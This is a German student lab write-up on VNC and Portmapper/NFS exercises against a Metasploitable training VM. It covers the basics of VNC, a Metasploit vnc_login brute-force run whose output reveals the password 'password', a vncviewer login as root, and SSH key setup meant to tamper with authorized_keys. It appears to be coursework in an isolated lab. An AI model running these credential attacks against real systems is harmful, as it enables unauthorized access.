## VNC Exploitation

### Übung (VNC - Recherche)
Die Aufgabe ist die Basics über VNC zu recherchieren und zu dokumentieren

Das VNC dient dazu um auf graphische Desktop Oberflächen aus der Ferne zuzugreifen.
Damit bewirkt man das Gefühl, als würde man wirklich an den zugegriffenen Computer sitzen.
Dabei sendet der VNC Server den Bildschirm des Zielrechners und der VNC Client (Viewer)
zeigt den entfernten Desktop an und sendet Eingaben. Für den Zugriff wird das Remote Framebuffer Protokoll verwendet,
wobei der Server Bildschirmänderungen vom Zielsystem empfängt und der Client Maus und Tastatur Eingaben sendet.
Die typisch verwendeten Ports sind TCP 5900 und TCP 5901

### Übung( VNC - Scan)

### Übung (VNC - Exploit)
Hier soll man das Modul unter auxiliary/scanner/vnc verwenden um die Login-Vulnerabilities zu testen. 

Hierfür muss man auf der Kali VM auf die Metasploitable Console zugreifen. Dafür wird folgender Befehl verwendet
```sh
$ msfconsole
```

Nun muss man auf das Modul zugreifen, was durch diesen Befehl zustande kommt
```sh
use auxiliary/scanner/vnc/vnc_login
```

Jetzt muss man den Host setzen, damit das Modul nun für diesen jegliche Passwörter durchprobieren kann
```sh
set RHOSTS 192.168.157.136
run
[*] 192.168.157.136:5900  - 192.168.157.136:5900 - Starting VNC login sweep
[!] 192.168.157.136:5900  - No active DB -- Credential data will not be saved!
[+] 192.168.157.136:5900  - 192.168.157.136:5900 - Login Successful: :password
[*] 192.168.157.136:5900  - Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
```
Hier erkennt man, dass der Login erfolgreich war und das Passwort "password" ist.
Jetzt kann man sich mit jenen Befehl anmelden.
```sh
vncviewer 192.168.157.136:5900
```
Nach der Eingabe muss man das Passwort eingeben und dann kann man sich auf die Metasploitable VM verbinden.
Im Fenster sieht man, dass die Anmeldung über den User "root" erfolgt ist.

## Portmapper/NFS Vulnerability

### Übung (ssh auf Metasploitable)
Als erstes muss ein Passwortloser ssh Zugriff auf der Metasploitable VM konfiguriert
werden um anschließend die ~/.ssh/authorized_keys Datei zu manipulieren.

Dazu wird erstmal ein public/private key Paar generiert
```sh
ssh-keygen -t rsa -b 2048
```
Nun muss man eine Datei erstellen, in der das Paar gespeichert wird. 
Dazu wählte ich den Namen "ssh_sus" wobei nun "ssh_sus" und "ssh_sus.pub" erstellt wird.

Da nun beide Files im Home Verzeichnis sind, moved man diese in ein erstelltes Directory 
und legt die Rechte fest.
```sh
$ mkdir ~/.ssh
$ chmod 700 ~/.ssh          
$ mv ssh_sus ~/.ssh
$ chmod 600 ~/.ssh/ssh_sus
$ mv ssh_sus.pub ~/.ssh
$ chmod 644 ~/.ssh/ssh_sus.pub
```

Da Kali einen nicht kompatiblen Authorisierungsalgorythmus nutzt, muss man diesen auf eine alten setzen,
um den Key zur Metasploitable VM zu kopieren.
```sh
$ ssh-copy-id -o HostKeyAlgorithms=+ssh-rsa -o PubkeyAcceptedAlgorithms=+ssh-rsa -i ~/.ssh/ssh_sus.pub msfadmin@192.168.157.136
```

Auch im Metasploitable müssen die Berechtigungen gesetzt werden
```sh
chmod 700 ~/.ssh
chmod 600 ~/.ssh/authorized_keys
```

Um sich nun auf die Metasploitable VM zu verbinden, wird folgender Befehl benötigt
```sh
ssh -o HostKeyAlgorithms=+ssh-rsa -o PubkeyAcceptedAlgorithms=+ssh-rsa msfadmin@192.168.157.136
```

**Tragischer Weise funktioniert das Passwortlose Verbinden noch nicht**
